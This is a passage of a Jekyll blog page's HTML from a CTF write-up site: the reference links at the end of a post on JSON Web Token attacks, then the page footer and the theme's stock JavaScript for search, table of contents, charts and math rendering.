+<ul>
+  <li><a href="https://www.slideshare.net/snyff/jwt-jku-x5u?from_action=save">JWT: jku x5u</a></li>
+  <li><a href="https://telegra.ph/JWS-writeups-03-28">JWS writeups</a></li>
+  <li><a href="https://www.youtube.com/watch?v=ThzZFIhuFMA">JWT Expert: jku Claim Misuse</a></li>
+  <li><a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c">Hacking JWT Tokens: jku Claim Misuse</a></li>
+  <li><a href="https://www.freebuf.com/articles/web/180874.html">深入了解Json Web Token之概念篇</a></li>
+  <li><a href="https://xz.aliyun.com/t/6776#toc-12">攻击JWT的一些方法</a></li>
+  <li><a href="https://www.freebuf.com/sectool/262183.html">如何使用MyJWT对JSON Web Token（JWT）进行破解和漏洞测试</a></li>
+  <li><a href="http://t.zoukankan.com/lowmanisbusy-p-10930856.html">Python 生成 JWT(json web token) 及 解析方式</a></li>
+  <li><a href="https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb">Attacking JSON Web Tokens (JWTs)</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2021-04-12T16:34:27+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/ctf/2021/03/29/VolgaCTF-2021-Qualifier-writeup.html">VolgaCTF 2021 Qualifier writeup</a></div><div class="next"><span>NEXT</span><a href="/ctf/2021/08/09/BSides-Noida-CTF-2021-WriteUp-Web%E9%83%A8%E5%88%86.html">BSides Noida CTF 2021 WriteUp Web部分</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
